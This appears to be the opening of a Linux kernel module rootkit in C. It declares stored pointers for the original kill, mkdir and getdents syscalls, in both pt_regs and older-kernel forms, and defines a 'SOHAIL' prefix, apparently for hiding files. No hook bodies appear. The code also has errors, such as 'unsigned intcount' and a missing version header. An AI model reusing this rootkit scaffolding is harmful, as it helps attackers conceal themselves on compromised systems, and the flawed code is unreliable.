#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>

#define PREFIX "SOHAIL"

#ifdef CONFIG_X86_64
/* on 64-bit x86 and kernel v4.17 syscalls are nolonger
 allowed to be called form the kernel*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)

#define PTREGS_SYSCALL_STUB 1
/* kill */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
/* mkdir */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_mkdir;
/* ls 64-bit*/
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_getdents64;
/* ls 32-bit */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_getdents;


#else
/* kill */
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
/* mkdir */
typedef asmlinkage long(*orig_mkdir_t)(const char __user *pathname, umode_t mode);
static orig_mkdir_t orig_mkdir;
/* ls 64-bit */
typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 *dirent, unsigned intcount);
static orig_getdents64_t orig_getdents64;
/* ls 32-bit */
typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent *dirent, unsigned intcount);
static orig_getdents_t orig_getdents;


#endif

#endif